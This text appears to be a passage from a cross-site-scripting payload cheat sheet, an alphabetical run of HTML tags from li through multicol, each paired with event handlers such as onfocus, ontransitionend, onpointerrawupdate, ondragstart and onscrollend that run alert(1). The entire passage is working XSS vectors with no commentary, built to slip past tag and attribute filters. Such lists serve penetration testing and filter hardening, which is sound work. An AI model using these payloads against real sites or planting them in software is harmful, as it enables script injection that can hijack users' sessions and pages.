<li id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></li>
<li id=x tabindex=1 onfocus=alert(1)></li>
<li id=x tabindex=1 onfocusin=alert(1)></li>
<li onafterscriptexecute=alert(1)><script>1</script>
<li onbeforecopy="alert(1)" contenteditable>test</li>
<li onbeforecut="alert(1)" contenteditable>test</li>
<li onbeforescriptexecute=alert(1)><script>1</script>
<li onblur=alert(1) id=x tabindex=1 style=display:block>test</li><input value=clickme>
<li onclick="alert(1)" style=display:block>test</li>
<li oncontextmenu="alert(1)" style=display:block>test</li>
<li oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<li oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<li ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</li>
<li onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</li><input value=clickme>
<li onkeydown="alert(1)" contenteditable style=display:block>test</li>
<li onkeypress="alert(1)" contenteditable style=display:block>test</li>
<li onkeyup="alert(1)" contenteditable style=display:block>test</li>
<li onmousedown="alert(1)" style=display:block>test</li>
<li onmouseenter="alert(1)" style=display:block>test</li>
<li onmouseleave="alert(1)" style=display:block>test</li>
<li onmousemove="alert(1)" style=display:block>test</li>
<li onmouseout="alert(1)" style=display:block>test</li>
<li onmouseover="alert(1)" style=display:block>test</li>
<li onmouseup="alert(1)" style=display:block>test</li>
<li onmousewheel=alert(1) style=display:block>requires scrolling
<li onpaste="alert(1)" contenteditable>test</li>
<li onpointerdown=alert(1) style=display:block>XSS</li>
<li onpointerenter=alert(1) style=display:block>XSS</li>
<li onpointerleave=alert(1) style=display:block>XSS</li>
<li onpointermove=alert(1) style=display:block>XSS</li>
<li onpointerout=alert(1) style=display:block>XSS</li>
<li onpointerover=alert(1) style=display:block>XSS</li>
<li onpointerrawupdate=alert(1) style=display:block>XSS</li>
<li onpointerup=alert(1) style=display:block>XSS</li>
<li onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></li>
<link contenteditable onbeforeinput=alert(1)>test
<link draggable="true" ondrag="alert(1)" style=display:block>test</link>
<link draggable="true" ondragend="alert(1)" style=display:block>test</link>
<link draggable="true" ondragenter="alert(1)" style=display:block>test</link>
<link draggable="true" ondragleave="alert(1)" style=display:block>test</link>
<link draggable="true" ondragstart="alert(1)" style=display:block>test</link>
<link href=validstyles.css rel=stylesheet onload=alert(1)>
<link id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></link>
<link onafterscriptexecute=alert(1)><script>1</script>
<link onbeforescriptexecute=alert(1)><script>1</script>
<link onblur=alert(1) id=x tabindex=1 style=display:block>test</link><input value=clickme>
<link onclick="alert(1)" style=display:block>test</link>
<link oncontextmenu="alert(1)" style=display:block>test</link>
<link oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<link oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<link ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</link>
<link onfocus=alert(1) id=x tabindex=1 style=display:block>
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>
<link onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</link><input value=clickme>
<link onkeydown="alert(1)" contenteditable style=display:block>test</link>
<link onkeypress="alert(1)" contenteditable style=display:block>test</link>
<link onkeyup="alert(1)" contenteditable style=display:block>test</link>
<link onmousedown="alert(1)" style=display:block>test</link>
<link onmouseenter="alert(1)" style=display:block>test</link>
<link onmouseleave="alert(1)" style=display:block>test</link>
<link onmousemove="alert(1)" style=display:block>test</link>
<link onmouseout="alert(1)" style=display:block>test</link>
<link onmouseover="alert(1)" style=display:block>test</link>
<link onmouseup="alert(1)" style=display:block>test</link>
<link onmousewheel=alert(1) style=display:block>requires scrolling
<link onpointerdown=alert(1) style=display:block>XSS</link>
<link onpointerenter=alert(1) style=display:block>XSS</link>
<link onpointerleave=alert(1) style=display:block>XSS</link>
<link onpointermove=alert(1) style=display:block>XSS</link>
<link onpointerout=alert(1) style=display:block>XSS</link>
<link onpointerover=alert(1) style=display:block>XSS</link>
<link onpointerrawupdate=alert(1) style=display:block>XSS</link>
<link onpointerup=alert(1) style=display:block>XSS</link>
<link onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></link>
<link rel=stylesheet href=1 onerror=alert(1)>
<listing contenteditable onbeforeinput=alert(1)>test
<listing draggable="true" ondrag="alert(1)" style=display:block>test</listing>
<listing draggable="true" ondragend="alert(1)" style=display:block>test</listing>
<listing draggable="true" ondragenter="alert(1)" style=display:block>test</listing>
<listing draggable="true" ondragleave="alert(1)" style=display:block>test</listing>
<listing draggable="true" ondragstart="alert(1)" style=display:block>test</listing>
<listing id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></listing>
<listing id=x tabindex=1 onfocus=alert(1)></listing>
<listing id=x tabindex=1 onfocusin=alert(1)></listing>
<listing onafterscriptexecute=alert(1)><script>1</script>
<listing onbeforecopy="alert(1)" contenteditable>test</listing>
<listing onbeforecut="alert(1)" contenteditable>test</listing>
<listing onbeforescriptexecute=alert(1)><script>1</script>
<listing onblur=alert(1) id=x tabindex=1 style=display:block>test</listing><input value=clickme>
<listing onclick="alert(1)" style=display:block>test</listing>
<listing oncontextmenu="alert(1)" style=display:block>test</listing>
<listing oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<listing oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<listing ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</listing>
<listing onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</listing><input value=clickme>
<listing onkeydown="alert(1)" contenteditable style=display:block>test</listing>
<listing onkeypress="alert(1)" contenteditable style=display:block>test</listing>
<listing onkeyup="alert(1)" contenteditable style=display:block>test</listing>
<listing onmousedown="alert(1)" style=display:block>test</listing>
<listing onmouseenter="alert(1)" style=display:block>test</listing>
<listing onmouseleave="alert(1)" style=display:block>test</listing>
<listing onmousemove="alert(1)" style=display:block>test</listing>
<listing onmouseout="alert(1)" style=display:block>test</listing>
<listing onmouseover="alert(1)" style=display:block>test</listing>
<listing onmouseup="alert(1)" style=display:block>test</listing>
<listing onmousewheel=alert(1) style=display:block>requires scrolling
<listing onpaste="alert(1)" contenteditable>test</listing>
<listing onpointerdown=alert(1) style=display:block>XSS</listing>
<listing onpointerenter=alert(1) style=display:block>XSS</listing>
<listing onpointerleave=alert(1) style=display:block>XSS</listing>
<listing onpointermove=alert(1) style=display:block>XSS</listing>
<listing onpointerout=alert(1) style=display:block>XSS</listing>
<listing onpointerover=alert(1) style=display:block>XSS</listing>
<listing onpointerrawupdate=alert(1) style=display:block>XSS</listing>
<listing onpointerup=alert(1) style=display:block>XSS</listing>
<listing onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></listing>
<main contenteditable onbeforeinput=alert(1)>test
<main draggable="true" ondrag="alert(1)" style=display:block>test</main>
<main draggable="true" ondragend="alert(1)" style=display:block>test</main>
<main draggable="true" ondragenter="alert(1)" style=display:block>test</main>
<main draggable="true" ondragleave="alert(1)" style=display:block>test</main>
<main draggable="true" ondragstart="alert(1)" style=display:block>test</main>
<main id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></main>
<main id=x tabindex=1 onfocus=alert(1)></main>
<main id=x tabindex=1 onfocusin=alert(1)></main>
<main onafterscriptexecute=alert(1)><script>1</script>
<main onbeforecopy="alert(1)" contenteditable>test</main>
<main onbeforecut="alert(1)" contenteditable>test</main>
<main onbeforescriptexecute=alert(1)><script>1</script>
<main onblur=alert(1) id=x tabindex=1 style=display:block>test</main><input value=clickme>
<main onclick="alert(1)" style=display:block>test</main>
<main oncontextmenu="alert(1)" style=display:block>test</main>
<main oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<main oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<main ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</main>
<main onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</main><input value=clickme>
<main onkeydown="alert(1)" contenteditable style=display:block>test</main>
<main onkeypress="alert(1)" contenteditable style=display:block>test</main>
<main onkeyup="alert(1)" contenteditable style=display:block>test</main>
<main onmousedown="alert(1)" style=display:block>test</main>
<main onmouseenter="alert(1)" style=display:block>test</main>
<main onmouseleave="alert(1)" style=display:block>test</main>
<main onmousemove="alert(1)" style=display:block>test</main>
<main onmouseout="alert(1)" style=display:block>test</main>
<main onmouseover="alert(1)" style=display:block>test</main>
<main onmouseup="alert(1)" style=display:block>test</main>
<main onmousewheel=alert(1) style=display:block>requires scrolling
<main onpaste="alert(1)" contenteditable>test</main>
<main onpointerdown=alert(1) style=display:block>XSS</main>
<main onpointerenter=alert(1) style=display:block>XSS</main>
<main onpointerleave=alert(1) style=display:block>XSS</main>
<main onpointermove=alert(1) style=display:block>XSS</main>
<main onpointerout=alert(1) style=display:block>XSS</main>
<main onpointerover=alert(1) style=display:block>XSS</main>
<main onpointerrawupdate=alert(1) style=display:block>XSS</main>
<main onpointerup=alert(1) style=display:block>XSS</main>
<main onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></main>
<map contenteditable onbeforeinput=alert(1)>test
<map draggable="true" ondrag="alert(1)" style=display:block>test</map>
<map draggable="true" ondragend="alert(1)" style=display:block>test</map>
<map draggable="true" ondragenter="alert(1)" style=display:block>test</map>
<map draggable="true" ondragleave="alert(1)" style=display:block>test</map>
<map draggable="true" ondragstart="alert(1)" style=display:block>test</map>
<map id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></map>
<map id=x tabindex=1 onfocus=alert(1)></map>
<map id=x tabindex=1 onfocusin=alert(1)></map>
<map onafterscriptexecute=alert(1)><script>1</script>
<map onbeforecopy="alert(1)" contenteditable>test</map>
<map onbeforecut="alert(1)" contenteditable>test</map>
<map onbeforescriptexecute=alert(1)><script>1</script>
<map onblur=alert(1) id=x tabindex=1 style=display:block>test</map><input value=clickme>
<map onclick="alert(1)" style=display:block>test</map>
<map oncontextmenu="alert(1)" style=display:block>test</map>
<map oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<map oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<map ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</map>
<map onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</map><input value=clickme>
<map onkeydown="alert(1)" contenteditable style=display:block>test</map>
<map onkeypress="alert(1)" contenteditable style=display:block>test</map>
<map onkeyup="alert(1)" contenteditable style=display:block>test</map>
<map onmousedown="alert(1)" style=display:block>test</map>
<map onmouseenter="alert(1)" style=display:block>test</map>
<map onmouseleave="alert(1)" style=display:block>test</map>
<map onmousemove="alert(1)" style=display:block>test</map>
<map onmouseout="alert(1)" style=display:block>test</map>
<map onmouseover="alert(1)" style=display:block>test</map>
<map onmouseup="alert(1)" style=display:block>test</map>
<map onmousewheel=alert(1) style=display:block>requires scrolling
<map onpaste="alert(1)" contenteditable>test</map>
<map onpointerdown=alert(1) style=display:block>XSS</map>
<map onpointerenter=alert(1) style=display:block>XSS</map>
<map onpointerleave=alert(1) style=display:block>XSS</map>
<map onpointermove=alert(1) style=display:block>XSS</map>
<map onpointerout=alert(1) style=display:block>XSS</map>
<map onpointerover=alert(1) style=display:block>XSS</map>
<map onpointerrawupdate=alert(1) style=display:block>XSS</map>
<map onpointerup=alert(1) style=display:block>XSS</map>
<map onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></map>
<mark contenteditable onbeforeinput=alert(1)>test
<mark draggable="true" ondrag="alert(1)" style=display:block>test</mark>
<mark draggable="true" ondragend="alert(1)" style=display:block>test</mark>
<mark draggable="true" ondragenter="alert(1)" style=display:block>test</mark>
<mark draggable="true" ondragleave="alert(1)" style=display:block>test</mark>
<mark draggable="true" ondragstart="alert(1)" style=display:block>test</mark>
<mark id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></mark>
<mark id=x tabindex=1 onfocus=alert(1)></mark>
<mark id=x tabindex=1 onfocusin=alert(1)></mark>
<mark onafterscriptexecute=alert(1)><script>1</script>
<mark onbeforecopy="alert(1)" contenteditable>test</mark>
<mark onbeforecut="alert(1)" contenteditable>test</mark>
<mark onbeforescriptexecute=alert(1)><script>1</script>
<mark onblur=alert(1) id=x tabindex=1 style=display:block>test</mark><input value=clickme>
<mark onclick="alert(1)" style=display:block>test</mark>
<mark oncontextmenu="alert(1)" style=display:block>test</mark>
<mark oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<mark oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<mark ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</mark>
<mark onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</mark><input value=clickme>
<mark onkeydown="alert(1)" contenteditable style=display:block>test</mark>
<mark onkeypress="alert(1)" contenteditable style=display:block>test</mark>
<mark onkeyup="alert(1)" contenteditable style=display:block>test</mark>
<mark onmousedown="alert(1)" style=display:block>test</mark>
<mark onmouseenter="alert(1)" style=display:block>test</mark>
<mark onmouseleave="alert(1)" style=display:block>test</mark>
<mark onmousemove="alert(1)" style=display:block>test</mark>
<mark onmouseout="alert(1)" style=display:block>test</mark>
<mark onmouseover="alert(1)" style=display:block>test</mark>
<mark onmouseup="alert(1)" style=display:block>test</mark>
<mark onmousewheel=alert(1) style=display:block>requires scrolling
<mark onpaste="alert(1)" contenteditable>test</mark>
<mark onpointerdown=alert(1) style=display:block>XSS</mark>
<mark onpointerenter=alert(1) style=display:block>XSS</mark>
<mark onpointerleave=alert(1) style=display:block>XSS</mark>
<mark onpointermove=alert(1) style=display:block>XSS</mark>
<mark onpointerout=alert(1) style=display:block>XSS</mark>
<mark onpointerover=alert(1) style=display:block>XSS</mark>
<mark onpointerrawupdate=alert(1) style=display:block>XSS</mark>
<mark onpointerup=alert(1) style=display:block>XSS</mark>
<mark onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></mark>
<marquee contenteditable onbeforeinput=alert(1)>test
<marquee draggable="true" ondrag="alert(1)" style=display:block>test</marquee>
<marquee draggable="true" ondragend="alert(1)" style=display:block>test</marquee>
<marquee draggable="true" ondragenter="alert(1)" style=display:block>test</marquee>
<marquee draggable="true" ondragleave="alert(1)" style=display:block>test</marquee>
<marquee draggable="true" ondragstart="alert(1)" style=display:block>test</marquee>
<marquee id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></marquee>
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>
<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
<marquee onafterscriptexecute=alert(1)><script>1</script>
<marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
<marquee onbeforecut="alert(1)" contenteditable>test</marquee>
<marquee onbeforescriptexecute=alert(1)><script>1</script>
<marquee onblur=alert(1) id=x tabindex=1 style=display:block>test</marquee><input value=clickme>
<marquee onclick="alert(1)" style=display:block>test</marquee>
<marquee oncontextmenu="alert(1)" style=display:block>test</marquee>
<marquee oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<marquee oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<marquee ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</marquee>
<marquee onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</marquee><input value=clickme>
<marquee onkeydown="alert(1)" contenteditable style=display:block>test</marquee>
<marquee onkeypress="alert(1)" contenteditable style=display:block>test</marquee>
<marquee onkeyup="alert(1)" contenteditable style=display:block>test</marquee>
<marquee onmousedown="alert(1)" style=display:block>test</marquee>
<marquee onmouseenter="alert(1)" style=display:block>test</marquee>
<marquee onmouseleave="alert(1)" style=display:block>test</marquee>
<marquee onmousemove="alert(1)" style=display:block>test</marquee>
<marquee onmouseout="alert(1)" style=display:block>test</marquee>
<marquee onmouseover="alert(1)" style=display:block>test</marquee>
<marquee onmouseup="alert(1)" style=display:block>test</marquee>
<marquee onmousewheel=alert(1) style=display:block>requires scrolling
<marquee onpaste="alert(1)" contenteditable>test</marquee>
<marquee onpointerdown=alert(1) style=display:block>XSS</marquee>
<marquee onpointerenter=alert(1) style=display:block>XSS</marquee>
<marquee onpointerleave=alert(1) style=display:block>XSS</marquee>
<marquee onpointermove=alert(1) style=display:block>XSS</marquee>
<marquee onpointerout=alert(1) style=display:block>XSS</marquee>
<marquee onpointerover=alert(1) style=display:block>XSS</marquee>
<marquee onpointerrawupdate=alert(1) style=display:block>XSS</marquee>
<marquee onpointerup=alert(1) style=display:block>XSS</marquee>
<marquee onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></marquee>
<marquee onstart=alert(1)>XSS</marquee>
<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
<menu contenteditable onbeforeinput=alert(1)>test
<menu draggable="true" ondrag="alert(1)" style=display:block>test</menu>
<menu draggable="true" ondragend="alert(1)" style=display:block>test</menu>
<menu draggable="true" ondragenter="alert(1)" style=display:block>test</menu>
<menu draggable="true" ondragleave="alert(1)" style=display:block>test</menu>
<menu draggable="true" ondragstart="alert(1)" style=display:block>test</menu>
<menu id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></menu>
<menu id=x tabindex=1 onfocus=alert(1)></menu>
<menu id=x tabindex=1 onfocusin=alert(1)></menu>
<menu onafterscriptexecute=alert(1)><script>1</script>
<menu onbeforecopy="alert(1)" contenteditable>test</menu>
<menu onbeforecut="alert(1)" contenteditable>test</menu>
<menu onbeforescriptexecute=alert(1)><script>1</script>
<menu onblur=alert(1) id=x tabindex=1 style=display:block>test</menu><input value=clickme>
<menu onclick="alert(1)" style=display:block>test</menu>
<menu oncontextmenu="alert(1)" style=display:block>test</menu>
<menu oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<menu oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<menu ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</menu>
<menu onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</menu><input value=clickme>
<menu onkeydown="alert(1)" contenteditable style=display:block>test</menu>
<menu onkeypress="alert(1)" contenteditable style=display:block>test</menu>
<menu onkeyup="alert(1)" contenteditable style=display:block>test</menu>
<menu onmousedown="alert(1)" style=display:block>test</menu>
<menu onmouseenter="alert(1)" style=display:block>test</menu>
<menu onmouseleave="alert(1)" style=display:block>test</menu>
<menu onmousemove="alert(1)" style=display:block>test</menu>
<menu onmouseout="alert(1)" style=display:block>test</menu>
<menu onmouseover="alert(1)" style=display:block>test</menu>
<menu onmouseup="alert(1)" style=display:block>test</menu>
<menu onmousewheel=alert(1) style=display:block>requires scrolling
<menu onpaste="alert(1)" contenteditable>test</menu>
<menu onpointerdown=alert(1) style=display:block>XSS</menu>
<menu onpointerenter=alert(1) style=display:block>XSS</menu>
<menu onpointerleave=alert(1) style=display:block>XSS</menu>
<menu onpointermove=alert(1) style=display:block>XSS</menu>
<menu onpointerout=alert(1) style=display:block>XSS</menu>
<menu onpointerover=alert(1) style=display:block>XSS</menu>
<menu onpointerrawupdate=alert(1) style=display:block>XSS</menu>
<menu onpointerup=alert(1) style=display:block>XSS</menu>
<menu onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></menu>
<menuitem contenteditable onbeforeinput=alert(1)>test
<menuitem draggable="true" ondrag="alert(1)" style=display:block>test</menuitem>
<menuitem draggable="true" ondragend="alert(1)" style=display:block>test</menuitem>
<menuitem draggable="true" ondragenter="alert(1)" style=display:block>test</menuitem>
<menuitem draggable="true" ondragleave="alert(1)" style=display:block>test</menuitem>
<menuitem draggable="true" ondragstart="alert(1)" style=display:block>test</menuitem>
<menuitem id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></menuitem>
<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
<menuitem onafterscriptexecute=alert(1)><script>1</script>
<menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
<menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
<menuitem onbeforescriptexecute=alert(1)><script>1</script>
<menuitem onblur=alert(1) id=x tabindex=1 style=display:block>test</menuitem><input value=clickme>
<menuitem onclick="alert(1)" style=display:block>test</menuitem>
<menuitem oncontextmenu="alert(1)" style=display:block>test</menuitem>
<menuitem oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<menuitem oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<menuitem ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</menuitem>
<menuitem onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</menuitem><input value=clickme>
<menuitem onkeydown="alert(1)" contenteditable style=display:block>test</menuitem>
<menuitem onkeypress="alert(1)" contenteditable style=display:block>test</menuitem>
<menuitem onkeyup="alert(1)" contenteditable style=display:block>test</menuitem>
<menuitem onmousedown="alert(1)" style=display:block>test</menuitem>
<menuitem onmouseenter="alert(1)" style=display:block>test</menuitem>
<menuitem onmouseleave="alert(1)" style=display:block>test</menuitem>
<menuitem onmousemove="alert(1)" style=display:block>test</menuitem>
<menuitem onmouseout="alert(1)" style=display:block>test</menuitem>
<menuitem onmouseover="alert(1)" style=display:block>test</menuitem>
<menuitem onmouseup="alert(1)" style=display:block>test</menuitem>
<menuitem onmousewheel=alert(1) style=display:block>requires scrolling
<menuitem onpaste="alert(1)" contenteditable>test</menuitem>
<menuitem onpointerdown=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointerenter=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointerleave=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointermove=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointerout=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointerover=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointerrawupdate=alert(1) style=display:block>XSS</menuitem>
<menuitem onpointerup=alert(1) style=display:block>XSS</menuitem>
<menuitem onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></menuitem>
<meta contenteditable onbeforeinput=alert(1)>test
<meta draggable="true" ondrag="alert(1)" style=display:block>test</meta>
<meta draggable="true" ondragend="alert(1)" style=display:block>test</meta>
<meta draggable="true" ondragenter="alert(1)" style=display:block>test</meta>
<meta draggable="true" ondragleave="alert(1)" style=display:block>test</meta>
<meta draggable="true" ondragstart="alert(1)" style=display:block>test</meta>
<meta id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></meta>
<meta id=x tabindex=1 onfocus=alert(1) style=display:block></meta>
<meta id=x tabindex=1 onfocusin=alert(1) style=display:block></meta>
<meta onafterscriptexecute=alert(1)><script>1</script>
<meta onbeforecopy="alert(1)" contenteditable style=display:block>test</meta>
<meta onbeforecut="alert(1)" contenteditable style=display:block>test</meta>
<meta onbeforescriptexecute=alert(1)><script>1</script>
<meta onblur=alert(1) id=x tabindex=1 style=display:block>test</meta><input value=clickme>
<meta onclick="alert(1)" style=display:block>test</meta>
<meta oncontextmenu="alert(1)" style=display:block>test</meta>
<meta oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<meta oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<meta ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</meta>
<meta onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</meta><input value=clickme>
<meta onkeydown="alert(1)" contenteditable style=display:block>test</meta>
<meta onkeypress="alert(1)" contenteditable style=display:block>test</meta>
<meta onkeyup="alert(1)" contenteditable style=display:block>test</meta>
<meta onmousedown="alert(1)" style=display:block>test</meta>
<meta onmouseenter="alert(1)" style=display:block>test</meta>
<meta onmouseleave="alert(1)" style=display:block>test</meta>
<meta onmousemove="alert(1)" style=display:block>test</meta>
<meta onmouseout="alert(1)" style=display:block>test</meta>
<meta onmouseover="alert(1)" style=display:block>test</meta>
<meta onmouseup="alert(1)" style=display:block>test</meta>
<meta onmousewheel=alert(1) style=display:block>requires scrolling
<meta onpaste="alert(1)" contenteditable style=display:block>test</meta>
<meta onpointerdown=alert(1) style=display:block>XSS</meta>
<meta onpointerenter=alert(1) style=display:block>XSS</meta>
<meta onpointerleave=alert(1) style=display:block>XSS</meta>
<meta onpointermove=alert(1) style=display:block>XSS</meta>
<meta onpointerout=alert(1) style=display:block>XSS</meta>
<meta onpointerover=alert(1) style=display:block>XSS</meta>
<meta onpointerrawupdate=alert(1) style=display:block>XSS</meta>
<meta onpointerup=alert(1) style=display:block>XSS</meta>
<meta onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></meta>
<meter contenteditable onbeforeinput=alert(1)>test
<meter draggable="true" ondrag="alert(1)" style=display:block>test</meter>
<meter draggable="true" ondragend="alert(1)" style=display:block>test</meter>
<meter draggable="true" ondragenter="alert(1)" style=display:block>test</meter>
<meter draggable="true" ondragleave="alert(1)" style=display:block>test</meter>
<meter draggable="true" ondragstart="alert(1)" style=display:block>test</meter>
<meter id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></meter>
<meter id=x tabindex=1 onfocus=alert(1)></meter>
<meter id=x tabindex=1 onfocusin=alert(1)></meter>
<meter onafterscriptexecute=alert(1)><script>1</script>
<meter onbeforecopy="alert(1)" contenteditable>test</meter>
<meter onbeforecut="alert(1)" contenteditable>test</meter>
<meter onbeforescriptexecute=alert(1)><script>1</script>
<meter onblur=alert(1) id=x tabindex=1 style=display:block>test</meter><input value=clickme>
<meter onclick="alert(1)" style=display:block>test</meter>
<meter oncontextmenu="alert(1)" style=display:block>test</meter>
<meter oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<meter oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<meter ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</meter>
<meter onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</meter><input value=clickme>
<meter onkeydown="alert(1)" contenteditable style=display:block>test</meter>
<meter onkeypress="alert(1)" contenteditable style=display:block>test</meter>
<meter onkeyup="alert(1)" contenteditable style=display:block>test</meter>
<meter onmousedown="alert(1)" style=display:block>test</meter>
<meter onmouseenter="alert(1)" style=display:block>test</meter>
<meter onmouseleave="alert(1)" style=display:block>test</meter>
<meter onmousemove="alert(1)" style=display:block>test</meter>
<meter onmouseout="alert(1)" style=display:block>test</meter>
<meter onmouseover="alert(1)" style=display:block>test</meter>
<meter onmouseup="alert(1)" style=display:block>test</meter>
<meter onmousewheel=alert(1) style=display:block>requires scrolling
<meter onpaste="alert(1)" contenteditable>test</meter>
<meter onpointerdown=alert(1) style=display:block>XSS</meter>
<meter onpointerenter=alert(1) style=display:block>XSS</meter>
<meter onpointerleave=alert(1) style=display:block>XSS</meter>
<meter onpointermove=alert(1) style=display:block>XSS</meter>
<meter onpointerout=alert(1) style=display:block>XSS</meter>
<meter onpointerover=alert(1) style=display:block>XSS</meter>
<meter onpointerrawupdate=alert(1) style=display:block>XSS</meter>
<meter onpointerup=alert(1) style=display:block>XSS</meter>
<meter onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></meter>
<multicol contenteditable onbeforeinput=alert(1)>test
<multicol draggable="true" ondrag="alert(1)" style=display:block>test</multicol>
<multicol draggable="true" ondragend="alert(1)" style=display:block>test</multicol>
<multicol draggable="true" ondragenter="alert(1)" style=display:block>test</multicol>
<multicol draggable="true" ondragleave="alert(1)" style=display:block>test</multicol>
<multicol draggable="true" ondragstart="alert(1)" style=display:block>test</multicol>
<multicol id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></multicol>
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
<multicol onafterscriptexecute=alert(1)><script>1</script>
